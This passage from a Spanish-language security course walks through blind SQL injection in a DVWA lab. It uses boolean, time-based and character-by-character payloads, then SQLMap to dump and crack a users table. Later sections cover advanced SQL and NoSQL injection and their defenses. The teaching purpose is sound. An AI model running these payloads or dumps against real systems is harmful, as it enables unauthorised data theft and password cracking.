Comience enviando una respuesta normal, como ingresar '2', para ver cómo se comporta la aplicación en circunstancias normales. Esto ayuda a establecer una base para el comportamiento esperado sin necesidad de inyectar código SQL.

![SQL 16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql16.png?raw=true)

**Paso 2: prueba sencilla**

Realice una prueba sencilla ingresando una comilla simple ( 2‘#) después del '2' para verificar si esto podría indicar una vulnerabilidad potencial en la aplicación web. Si se produce un error o el comportamiento cambia, podría sugerir que la aplicación está manejando incorrectamente la entrada del usuario y puede ser susceptible a la inyección SQL. Este ( ‘) no es obligatorio en todos los casos y puede variar según la base de datos en la que esté probando.

NOTA: Al realizar pruebas dentro de un campo de formulario, debe colocar un #al final de su consulta para comentar cualquier texto que el programa pueda agregar posteriormente.

![SQL 17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql17.png?raw=true)

**Paso 3: prueba de verdadero/falso**

Realice las pruebas de verdadero/falso inyectando condiciones " " 2’ AND 1=1#(siempre verdadera) y " 2’ AND 1=0#" (siempre falsa) y observe las respuestas de la aplicación a ambas consultas. Si el comportamiento de la aplicación cambia según la veracidad de la condición inyectada, indica que el código SQL se está ejecutando, confirmando la presencia de una vulnerabilidad.

En un ataque de inyección SQL normal, esta condición verdadera podría devolver información adicional de una tabla, pero ese no es el caso en un ataque ciego. Nuevamente, estás buscando cambios en la respuesta.

![SQL 18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql18.png?raw=true)

*El resultado de 1=1, una condición intencionalmente verdadera.*

![SQL 19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql19.png?raw=true)

*El resultado de 1=0, una condición intencionalmente falsa.*

**Paso 4: prueba basada en el tiempo**

Pruebe el método basado en tiempos introduciendo " 2’ AND SLEEP(5)#" en la consulta. Compare el tiempo de respuesta con y sin el comando de suspensión. Un retraso notable indica una vulnerabilidad potencial, ya que demuestra que la aplicación está ejecutando el comando SQL inyectado y esperando el tiempo especificado antes de devolver una respuesta.

![SQL 20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql20.png?raw=true)

> *Ejecutar el ataque basado en el tiempo.*

![SQL 21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql21.png?raw=true)

> *Ataque basado en tiempo completo.*

**Paso 5: determinar las columnas**

Determine la cantidad de columnas en la base de datos usando la 2’ ORDER BY X#condición " ", donde X es la cantidad de columnas que estamos probando. Incremente el número hasta que cambie el comportamiento de la aplicación, lo que significa que ha encontrado la longitud correcta. Este paso es esencial para comprender la estructura de la base de datos, lo que puede resultar útil a la hora de explotar la vulnerabilidad.

![SQL 22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql22.png?raw=true)

> *Prueba manual para una longitud de columna de 1.*

![SQL 23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql23.png?raw=true)

> *Prueba manual para una longitud de columna de 2.*

<aside>
👉 En nuestro caso, la aplicación web arrojó un error cuando probamos una longitud de columna de 3. Este cambio en el comportamiento nos permite saber que hemos identificado que el número correcto de columnas es 2, ya que esa fue la última prueba exitosa antes del cambio. . Esto se aprende observando el cambio en respuesta.

</aside>

**Paso 6: Determinar la longitud de DB**

A continuación, demostraremos la 2’ AND LENGTH(DATABASE())=X#condición " ", donde X es el número de caracteres que se prueban. Esto se puede utilizar para determinar la longitud del nombre de la base de datos. Usaremos el mismo enfoque que acabamos de usar para determinar el número de columnas, excepto que esta vez intentamos obtener el número de caracteres en el nombre de la base de datos. Para hacer esto, probaremos por longitud de caracteres de manera iterativa.

![SQL 24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql24.png?raw=true)

> *Prueba para una longitud de carácter de 1.*

![SQL 25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql25.png?raw=true)

> *Finalmente, un cambio indica una longitud de nombre de base de datos de 4.*

Esto también se puede realizar con un comando de suspensión en los casos en que no haya un indicador visual disponible. Por ejemplo, utilice " 2’ AND LENGTH(DATABASE())=X AND SLEEP(5)#" donde X es la longitud sospechosa de la base de datos. Si el comando de suspensión retrasa la respuesta de la aplicación, confirma la longitud correcta de la base de datos.

![SQL 26](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql26.png?raw=true)

**Paso 7: determinar el nombre de la base de datos**

Finalmente, podemos comenzar a enumerar el nombre real de la base de datos. Ya sabemos que tiene cuatro caracteres, pero podemos hacer más determinando cuáles son esos caracteres. Para hacer esto, probaremos diferentes caracteres ASCII usando 2’ AND ASCII(SUBSTR(DATABASE(),X,X))>YY#. En este caso X, es la posición del carácter que estamos probando y YYes el **[carácter decimal ASCII](https://www.asciitable.com/)** .

Con este método, le pregunta a la base de datos si el primer carácter es mayor que una letra establecida. Si no es así, responderá con una negativa. Comenzaremos en algún lugar cerca de la mitad del alfabeto minúsculo con “l” (que es el decimal ASCII 108). Entonces la consulta se ve así: 2’ AND ASCII(SUBSTR(DATABASE(),1,1))>108#.

![SQL 27](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql27.png?raw=true))

Según la respuesta, sabemos que el primer carácter no es mayor que “l”, por lo que tenemos que cambiar la operación para preguntar si es menor que “l”. Hacemos esto cambiando la consulta a 2’ AND ASCII(SUBSTR(DATABASE(),1,1))<108#.

![SQL 28](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql28.png?raw=true)

![SQL 29](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql29.png?raw=true)

Según esta respuesta, ahora sabemos que la primera letra está en algún lugar entre la “l” minúscula y todos los caracteres ASCII anteriores. Técnicamente, esto incluye todas las mayúsculas, números y caracteres especiales. Sabiendo esto podemos empezar a probar de forma incremental hasta que veamos un cambio en la respuesta. En nuestro caso, vemos una respuesta modificada una vez que ingresamos 100.

![SQL 30](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql30.png?raw=true)

![SQL 31](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql31.png?raw=true)

Esto ahora nos dice que el carácter no es menor que una “d” minúscula. Podemos confirmar que esta es la letra correcta invirtiendo la consulta.

![SQL 32](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql32.png?raw=true)

![SQL 33](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql33.png?raw=true)

Hemos confirmado con éxito el primer personaje. Ahora, podemos usar este mismo método cambiando la consulta a la ubicación del segundo carácter y repitiendo esto nuevamente. Nos aseguraremos de cambiar la ubicación ingresando 2’ AND ASCII(SUBSTR(DATABASE(),2,2))<108#.

![SQL 34](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql34.png?raw=true)

![SQL 35](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql35.png?raw=true)

![SQL 36](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql36.png?raw=true)

> *Con este resultado, sabemos que el segundo carácter es mayor que la “l” minúscula.*

A estas alturas, debería comprender el fundamento de cada paso. Al observar el comportamiento de la aplicación en respuesta a varios comandos SQL inyectados, puede identificar y comprender eficazmente las vulnerabilidades de inyección SQL ciega.

En la siguiente sección, demostraremos cómo explotar estas vulnerabilidades con la ayuda de SQLMap. Continúe practicando estas técnicas en un entorno controlado para perfeccionar sus habilidades y convertirse en un experto en la detección y explotación de ataques de inyección SQL ciega.

### **Ejemplo 1: Explotación de la inyección SQL ciega**

Ahora que hemos confirmado la vulnerabilidad, seguiremos los pasos para explotarla usando SQLMap. Preste atención a las capturas de pantalla de cada paso para una mejor comprensión. Aún mejor, sigue las instrucciones para consolidar realmente el proceso y el aprendizaje en tu mente y desarrollar esta habilidad.

**Paso 1: familiarizarse con SQLMap**

Abra la página de ayuda de SQLMap para familiarizarse con el tipo de información necesaria para un ataque y la estructura de comando de la herramienta. En concreto veremos que podemos utilizar una URL con la -ubandera y la información de la cookie con la bandera `--cookie=COOKIE.`

`sqlmap -h`

![SQL 37](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql37.png?raw=true)

**Paso 2: recuperar información de la sesión**

Recopile las cookies requeridas y el nivel de seguridad del Panel de desarrollador del navegador en la pestaña Almacenamiento.

![SQL 38](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql38.png?raw=true)

**Paso 3: comando URL de SQLMap**

Ejecute SQLMap con la información -uy --cookie=. Revise la información resultante, que incluye los parámetros, la carga útil y la ubicación de los archivos de salida.

![SQL 39](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql39.png?raw=true)

> *SQLMap ejecutando ataque URL.*

![SQL 40](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql40.png?raw=true)

> *Devolución de parámetros y ubicación de salida.*

**Paso 4: abrir el archivo de sesión**

Ahora iremos a la terminal y navegaremos hasta la ubicación del archivo de salida. Primero, lo usaremos para ver con qué archivos tenemos para trabajar. Utilícelo sqlitebrowserpara abrir el session.sqlitearchivo.

![SQL 41](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql41.png?raw=true)

**Paso 5: Navegador de base de datos**

En el navegador sqlite, examine la estructura de la base de datos y explore las pestañas de datos.

![SQL 42](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql42.png?raw=true)

> *Visualización de la pestaña "Estructura de la base de datos" en DB Browser.*

![SQL 43](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql43.png?raw=true)

> *Visualización de la pestaña "Buscar datos" en DB Browser.*

**Paso 6: ver el archivo de destino**

Regrese a la terminal y use cat target.txtpara ver el archivo que contiene el comando que usó.

![SQL 44](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql44.png?raw=true)

**Paso 7: Ver registro**

Úselo cat log para ver el contenido del registro. Esto incluye la misma información de parámetros y carga útil que vimos anteriormente, así como detalles sobre la base de datos y la tecnología de la aplicación web. Toda esta información podría ser útil en cualquier seguimiento de las pruebas de penetración que podamos realizar en etapas posteriores.

![SQL 45](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql45.png?raw=true)

**Paso 8: URL de SQLMap con indicador de nombre de base de datos**

Ahora regresaremos a la terminal y ejecutaremos el mismo comando en SQLMap, pero esta vez agregaremos '--dbs' para descubrir el nombre de la base de datos. Sabemos que tiene cuatro caracteres debido a nuestra prueba manual anterior, pero queremos saber más sobre esta base de datos.

![SQL 46](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql46.png?raw=true)

> *¡Y ahí está, “dvwa”!*

**Paso 9: URL de SQLMap con indicador de columna**

A continuación, queremos obtener las columnas de usuario con las banderas -D dvwa -T users --columns. Esto le proporcionará mucha más información sobre lo que realmente hay dentro de la base de datos.

![SQL 47](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql47.png?raw=true)

![SQL 48](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql48.png?raw=true)

**Paso 10: URL de SQLMap con indicador de volcado de usuario**

Ahora llegamos a la parte buena, utilícela -T users --dumppara extraer datos de la tabla del usuario. Revise la respuesta y observe cómo SQLMap le solicita que descifre el hash de las contraseñas que descubre y luego le presenta los resultados en una tabla clara y ordenada.

![SQL 49](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql49.png?raw=true)

![SQL 50](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql50.png?raw=true)

> *Aquí revisa la base de datos y extrae información del usuario.*

![SQL 51](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql51.png?raw=true)

> *SQLMap ofrece descifrar los hashes de contraseñas. ¡Sí, por favor!*

![SQL 52](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql52.png?raw=true)

Observe la ordenada disposición de la información en la imagen de arriba. Además de simplemente descifrar las contraseñas y colocarlas en una tabla ordenada, SQLMap también genera automáticamente esa información en un archivo .csv. Luego, esto se puede incorporar a otras herramientas para realizar más exploits durante un caso de prueba de penetración.

### **Ejemplo 2: Explotación de la inyección SQL ciega con datos HTTP**

Ahora demostraremos un método alternativo para explotar la inyección SQL ciega utilizando SQLMap y **la recopilación de datos HTTP de Burp Suite** .

**Paso 1: Intercepta el tráfico con Burp Suite**

Abra Burp Suite, que ha configurado para capturar el tráfico HTTP. Luego navegue hasta la pestaña Proxy y localice el envío de la consulta en el historial HTTP.

![SQL 53](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql53.png?raw=true)

**Paso 2: enviar solicitud al repetidor**

En el panel Solicitud, haga clic derecho en el envío de la consulta y seleccione 'Enviar al repetidor'.

**Paso 3: copie los datos sin procesar de Burp Suite**

Cambie a la pestaña Repetidor y copie los datos de la solicitud sin procesar del panel.

![SQL 54](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql54.png?raw=true)

**Paso 4: crear archivo de solicitud**

Pegue los datos de la solicitud sin procesar en un archivo nuevo que usará con SQLMap. En nuestro ejemplo, llamamos a este archivo request.

![SQL 55](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql55.png?raw=true)

**Paso 5: SQLMap carga el archivo de solicitud HTTP**

Regrese a la terminal y ejecute el comando sqlmap -r request. El -rindicador le indica a SQLMap que analice y utilice la solicitud HTTP sin formato del archivo especificado.

![SQL 56](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql56.png?raw=true)

Como en el método anterior, SQLMap ofrecerá descifrar los hash de contraseña del usuario descubierto una vez que haya extraído los datos.

![SQL 57](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql57.png?raw=true)

<aside>
👉 Este método proporciona una alternativa a la introducción manual de información de cookies y URL en la línea de comando, lo que agiliza el proceso utilizando el tráfico HTTP capturado. Como en los métodos anteriores, esta información se envía a su directorio y puede estudiarse o utilizarse para esfuerzos futuros.

</aside>

## **Defensa contra la inyección SQL ciega**

Si sigue las mejores prácticas y pautas recomendadas por organizaciones acreditadas como **OWASP** , NIST, W3 y Amazon AWS, puede fortalecer significativamente las defensas de su aplicación contra estos ataques.

Estas organizaciones proporcionan información y recursos valiosos que cubren una amplia gama de temas, incluidas prácticas de codificación segura, seguridad de bases de datos, defensas de aplicaciones web y monitoreo y respuesta a incidentes. En esta sección, exploraremos estas mejores prácticas en detalle y le brindaremos pasos prácticos para ayudar a proteger su aplicación web contra vulnerabilidades de inyección SQL ciega.

### **Prácticas de codificación segura**

La implementación de prácticas de codificación segura es crucial para defenderse contra ataques de inyección SQL ciega. **[OWASP recomienda utilizar declaraciones preparadas](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)** o consultas parametrizadas para separar la entrada del usuario del código SQL, lo que reduce el riesgo de inyección. Además, la incorporación de técnicas de validación de entradas, como las listas blancas, ayuda a **restringir los tipos de datos que pueden introducir** los usuarios, lo que mejora aún más la seguridad.

### **Seguridad de la base de datos**

Las medidas de seguridad de la base de datos son esenciales para minimizar el impacto potencial de un ataque. Limitar los privilegios de los usuarios de la base de datos garantiza que los atacantes no puedan obtener acceso a información confidencial ni realizar acciones no autorizadas. Actualizar y parchear periódicamente su sistema de administración de bases de datos ayuda a abordar las vulnerabilidades conocidas, lo que dificulta que los atacantes las exploten. Puede leer más sobre esto en **[NIST SP 800-44 versión 2](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)** (la Sección 6.4.2 analiza esto específicamente).

### **Defensas de aplicaciones web**

La implementación de defensas de aplicaciones web, como un firewall de aplicaciones web (WAF), puede ayudar a detectar y bloquear los intentos de inyección de SQL. **[Amazon AWS analiza](https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups-use-case.html)** cómo un WAF analiza el tráfico entrante y filtra solicitudes maliciosas a través de grupos de reglas administrados por bases de datos, lo que reduce la probabilidad de un ataque exitoso.

### **Seguimiento y respuesta a incidentes**

Monitorear y registrar la actividad de las aplicaciones es vital para identificar actividades sospechosas y detectar posibles ataques desde el principio. **[NIST recomienda](https://csrc.nist.gov/publications/detail/sp/800-44/version-2/final)** establecer un sistema sólido de registro y monitoreo, junto con un plan de respuesta a incidentes bien definido, que garantice respuestas rápidas y efectivas a los incidentes de seguridad.

## **Conclusión**

A lo largo de este artículo, hemos profundizado en la inyección SQL ciega, explorando sus características únicas y las técnicas utilizadas para descubrir y explotar estas vulnerabilidades. Desde configurar un entorno de prueba con DVWA y Kali Linux hasta realizar pruebas manuales y utilizar herramientas como SQLMap y Burp Suite, le proporcionamos orientación práctica y consejos prácticos para adquirir habilidades en este tema complejo.

Además, hemos enfatizado la importancia de implementar medidas de seguridad sólidas, como prácticas de codificación segura, seguridad de bases de datos, defensas de aplicaciones web y monitoreo y respuesta a incidentes para protegerse contra ataques de inyección SQL ciega.

Como hemos demostrado, la inyección ciega de SQL es un desafío formidable en la seguridad cibernética para aplicaciones web, pero con el conocimiento y las habilidades adecuados, puede defenderse eficazmente contra estas amenazas. Continúe su aprendizaje tomando estos cursos para reforzar su aptitud en defensa y piratería ética de aplicaciones web:

## **Preguntas frecuentes**

- **¿Cuáles son los tipos de inyección SQL ciega?**

Hay dos tipos principales de inyección SQL ciega:

**Inyección SQL ciega basada en booleanos** : en este tipo, los atacantes infieren información de las respuestas de la aplicación web, como cambios en el contenido, mensajes de error o códigos de estado HTTP, aunque el resultado de la consulta real no es directamente visible.

**Inyección SQL ciega basada en el tiempo** : en este tipo, los atacantes introducen retrasos en sus consultas SQL utilizando funciones sensibles al tiempo (por ejemplo, SLEEP o WAITFOR DELAY) y observan el tiempo de respuesta de la aplicación web para inferir información sobre la base de datos. Los diferentes tiempos de respuesta indican si la condición inyectada era verdadera o falsa.

- **¿Qué es la respuesta condicional de inyección SQL ciega?**

Una respuesta condicional de inyección SQL ciega, también conocida como inyección SQL ciega basada en contenido o booleana, es una técnica utilizada por los atacantes para extraer información de una aplicación web vulnerable sin ver directamente el resultado de sus consultas SQL inyectadas.

En cambio, los atacantes inyectan declaraciones SQL con condiciones verdaderas o falsas y observan cambios en el comportamiento o contenido de la aplicación web en función de la veracidad de estas condiciones. Al analizar estas respuestas, el atacante puede inferir indirectamente la información que busca en la base de datos.

Piense en esto como un juego malicioso de 20 preguntas.

- **¿Qué herramientas se pueden utilizar para explotar la inyección SQL ciega?**

Existen varias herramientas que se pueden utilizar para explotar las vulnerabilidades de inyección SQL ciega. Algunas de las herramientas más populares y efectivas incluyen:

1. SQLMap: SQLMap, una herramienta de código abierto poderosa y ampliamente utilizada, automatiza la detección y explotación de vulnerabilidades de inyección SQL.

2. Burp Suite: Esta es una plataforma integral de prueba de seguridad de aplicaciones web, que incluye una gama de herramientas para detectar y explotar vulnerabilidades de inyección SQL ciega, como los módulos Repetidor e Intruso.

3. Pruebas manuales: si bien las herramientas automatizadas pueden resultar muy útiles, las pruebas manuales siguen desempeñando un papel esencial en la detección y explotación de vulnerabilidades de inyección SQL ciega.

- **¿Cuáles son las señales de que un sitio web es vulnerable a la inyección SQL ciega?**

Si bien ningún indicador garantiza la presencia de una vulnerabilidad, los siguientes signos pueden sugerir que una aplicación web podría ser susceptible a una inyección SQL ciega:

1. Comportamiento inesperado: si la aplicación muestra un comportamiento inusual cuando ciertos caracteres (como comillas simples o dobles) se ingresan en los campos de entrada del usuario, puede indicar que la aplicación no está manejando o desinfectando adecuadamente la entrada del usuario.

2. Respuestas condicionales: al inyectar consultas SQL que deberían devolver verdadero o falso, si la aplicación muestra un comportamiento diferente según la veracidad de la condición inyectada, puede sugerir una vulnerabilidad de inyección SQL ciega.

3. Retrasos de tiempo: la aplicación experimenta retrasos notables en el tiempo de respuesta cuando se inyectan consultas SQL específicas (por ejemplo, al usar la SLEEP()función).

4. Mensajes de error: si bien es posible que los mensajes de error no sean directamente visibles en los ataques de inyección SQL ciega, se debe evaluar cualquier mensaje de error o respuesta inusual de la aplicación.

- **¿Cuáles son las mejores prácticas para prevenir la inyección SQL ciega?**

Las mejores prácticas para prevenir la inyección ciega de SQL implican una combinación de prácticas de codificación segura, medidas de seguridad de bases de datos, defensas de aplicaciones web y estrategias de monitoreo y respuesta a incidentes.

**Advanced SQL Injection**

La inyección SQL avanzada es una técnica más sofisticada que la inyección SQL básica, que utiliza técnicas más complejas para explotar vulnerabilidades en las aplicaciones web. Esto puede incluir la manipulación de los datos de entrada de la aplicación, la identificación de patrones de filtrado, la explotación de errores en la aplicación y la utilización de herramientas automatizadas para la inyección de código malicioso. Este ataque puede tener consecuencias graves, como la exposición de información confidencial, el robo de datos, la alteración de la información almacenada en la base de datos y la pérdida de datos importantes. Por lo tanto, es importante que las empresas y desarrolladores de aplicaciones web implementen medidas de seguridad adecuadas para evitar este tipo de ataques.

![SQL 58](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql58.png?raw=true)

## Consecuencias

Las consecuencias de una inyección SQL Avanzadas pueden incluir:

- **Pérdida o alteración de datos:** el atacante puede eliminar, modificar o extraer información de la base de datos.
- **Inestabilidad del sistema:** el código malicioso puede causar que la base de datos deje de funcionar correctamente, lo que puede resultar en tiempos de inactividad y pérdida de disponibilidad.
- **Dificultad para detectar y mitigar el ataque:** debido a que el código malicioso se inserta en una consulta SQL legítima.
- **Posibilidad de propagación del ataque:** si el atacante tiene acceso a datos sensibles, como contraseñas de usuario, puede utilizarlos para propagar el ataque a otros sistemas.
- **Acceso no autorizado:** un atacante podría obtener acceso no autorizado al sistema o a la aplicación web, lo que le permitiría acceder a información confidencial o realizar acciones maliciosas en el sistema.
- **Modificación de datos:** un atacante podría modificar, eliminar o agregar datos al sistema, lo que podría tener graves consecuencias en la integridad y exactitud de los datos.
- **Ejecución de código malicioso:** un atacante podría ejecutar código malicioso en el sistema, lo que podría resultar en la toma de control del sistema o en el robo de información confidencial.
- **Denegación de servicio:** un atacante podría utilizar la inyección de comando para sobrecargar el sistema y hacer que se vuelva inoperable.

**La no corrección de esta falla puede causar divulgación no autorizada de su información y la de sus clientes que podría dar lugar a fraude, usurpación de identidad y a sanciones reglamentarias.** Para evitar la inyección de comandos, es importante validar y filtrar todas las entradas de usuario en las aplicaciones web, y evitar el uso de comandos de shell en aplicaciones web.  Además, es importante mantener todas las aplicaciones y sistemas actualizados y parcheados para evitar que se exploten vulnerabilidades conocidas.

## Solución

Para prevenir y solucionar la inyección SQL avanzada, se pueden tomar las siguientes medidas:

- **Validar y sanitizar todas las entradas de datos**: Asegúrese de que todas las entradas de datos, ya sean proporcionadas por los usuarios o por otras fuentes, sean validadas y sanitizadas adecuadamente antes de ser utilizadas en una consulta SQL.
- **Utilizar consultas parametrizadas:** En lugar de construir una consulta SQL dinámicamente utilizando cadenas de texto, utilice consultas parametrizadas que permitan que los parámetros sean pasados como argumentos separados. Esto reducirá la posibilidad de inyección SQL, ya que los valores de los parámetros son tratados como datos, no como parte de la consulta SQL.
- **Limitar los permisos de la base de datos:** Asegúrese de que los usuarios de la base de datos tengan solo los permisos necesarios para realizar sus funciones y nada más. Esto limitará el alcance de cualquier posible ataque.
- **Utilizar herramientas de seguridad y pruebas de penetración:** Realice pruebas regulares de seguridad y pruebas de penetración en la aplicación para identificar posibles vulnerabilidades y errores de seguridad. También puede utilizar herramientas de seguridad de terceros para proteger la aplicación contra la inyección SQL.
- **Actualización y parcheo del software de la base de datos y uso de firewalls de aplicación web (WAF)**

Es una tarea difícil determinar si una cadena de usuario es maliciosa o no. Por lo tanto, la mejor manera de hacerlo es “escapar” de los caracteres especiales en la entrada del usuario. Puede escapar una cadena antes de construir la consulta en PHP usando la función `mysql_escape_string()`. O en MySQL usando la función `mysqli_real_escape_string()`.

Mientras se muestra la salida como HTML, también tendrá que convertir la cadena para asegurarse de que los caracteres especiales no interfieren con el marcado HTML. Puede convertir caracteres especiales en PHP usando la función htmlspecialchars().

<aside>
👉 Alternativamente, puede usar sentencias preparadas para evitar las inyecciones de SQL. Una sentencia preparada es una plantilla de una consulta SQL, en la que se especifican los parámetros en una etapa posterior para ejecutarla. Aquí hay un ejemplo de una declaración preparada en PHP y MySQLi.

</aside>

`$query = $mysql_connection->prepare("select * from user_table where username = ? and password = ?");`

`$query->execute(array($username, $password));`

<aside>
📖 En resumen, para solucionar y prevenir la inyección SQL avanzada, es necesario validar y sanitizar todas las entradas de datos, utilizar consultas parametrizadas, limitar los permisos de la base de datos y utilizar herramientas de seguridad y pruebas de penetración.

</aside>

## Referencias

- [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [https://kinsta.com/es/blog/inyeccion-sql/](https://kinsta.com/es/blog/inyeccion-sql/)
- [https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)
- [https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/](https://www.wordfence.com/learn/how-to-prevent-sql-injection-attacks/)

# Inyección NoSQL - MongoDB

La Inyección NoSQL (NoSQL Injection) es una vulnerabilidad que ocurre cuando se ingresan datos no validados o maliciosos en una consulta NoSQL, lo que permite a un atacante manipular la consulta para obtener información confidencial, borrar datos o ejecutar código malicioso en el servidor.

Las consecuencias de una Inyección NoSQL pueden ser graves y variadas, dependiendo del tipo de datos que se almacenen en la base de datos y de la capacidad de los atacantes para explotar la vulnerabilidad.

![NoSQL1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL1.png?raw=true)

Al igual que cualquier ataque de inyección, consiste en utilizar un vector de ataque que al ejecutarse en la aplicación nos permita alterar el funcionamiento de la misma para obtener información, modificarla o saltearnos el proceso de login. Aunque no usar el lenguaje SQL puede hacer más difícil la ejecución de una inyección de código, no es defensa suficiente en contra de estos ataques.

Es cierto que, entonces, ya no funcionarían herramientas como SQLMap, que sirven para automatizar y facilitar los ataques de inyección SQL. No obstante, también hay exploits para otros tipos de lenguajes comunes como, por ejemplo, MongoDB.

Sencillamente, el atacante necesitará otra sintaxis si desea hacer una inyección de código en una base de datos diferente. Sin embargo, la configuración de tal página debe hacerse rigurosamente si desea evitarse un peligroso ataque de inyección NoSQL, que podría llevar a las mismas consecuencias de uno con SQL. Es decir, desde el robo de datos hasta el control total de la máquina.

## Consecuencias

Algunas de las posibles consecuencias de una Inyección NoSQL son:

- **Fuga de datos confidenciales**: Si los atacantes pueden manipular la consulta para obtener información confidencial, pueden acceder a datos como contraseñas, nombres de usuarios, direcciones de correo electrónico, números de tarjetas de crédito y otros datos sensibles.
- **Modificación o eliminación de datos:** Si los atacantes pueden manipular la consulta para modificar o eliminar datos, pueden causar daños significativos al sistema y a los datos almacenados.
- **Denegación de servicio (DoS):** Si los atacantes pueden manipular la consulta para ejecutar código malicioso en el servidor, pueden causar una sobrecarga del sistema o una denegación de servicio (DoS) que puede dejar fuera de línea el sitio web o la aplicación.
- **Vulnerabilidad en cadena:** Una Inyección NoSQL también puede ser el punto de entrada para una cadena de vulnerabilidades, lo que permite a los atacantes aprovechar otras vulnerabilidades en la aplicación o en el sistema para obtener más acceso y control.

<aside>
📖 En resumen, una Inyección NoSQL puede tener consecuencias graves para la seguridad y privacidad de los datos almacenados en una base de datos NoSQL, lo que puede afectar la reputación de la empresa, la confianza de los usuarios y la estabilidad del sistema. Es importante tomar medidas de seguridad para prevenir la Inyección NoSQL, como la validación de datos, el uso de parámetros en las consultas y la implementación de cortafuegos.

</aside>

## Solución

Para evitar la inyección NoSQL, es importante implementar las siguientes medidas de seguridad:

- **Validación de entrada de datos:** Todos los datos ingresados por los usuarios deben ser validados y filtrados para asegurarse de que no contienen caracteres maliciosos que puedan ser explotados en un ataque.
- **Limitación de permisos:** La base de datos debe ser configurada para limitar los permisos de los usuarios y solo permitir el acceso a las funciones y datos necesarios para realizar sus tareas.
- **Encriptación:** Los datos sensibles almacenados en la base de datos deben ser encriptados para protegerlos de accesos no autorizados.
- **Auditoría de seguridad:** Debe haber un sistema de registro de eventos y seguimiento de auditoría en lugar para detectar cualquier actividad sospechosa en la base de datos.
- **Actualizaciones de seguridad:** Mantener la base de datos actualizada con las últimas actualizaciones de seguridad y parches de software puede reducir la exposición a vulnerabilidades conocidas.

<aside>
💡 Además, es importante educar a los desarrolladores y usuarios sobre las buenas prácticas de seguridad y asegurarse de que todos los procedimientos de seguridad estén documentados y sean fácilmente accesibles para el equipo de desarrollo.

</aside>

## **Referencias**

- [https://arxiv.org/pdf/1506.04082.pdf](https://arxiv.org/pdf/1506.04082.pdf)
- [https://owasp.org/www-project-web-security-testing-guide](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.html)
- [A03 Injection - OWASP Top 10:2021](https://owasp.org/Top10/A03_2021-Injection/)
- [WSTG - v4.2 | OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
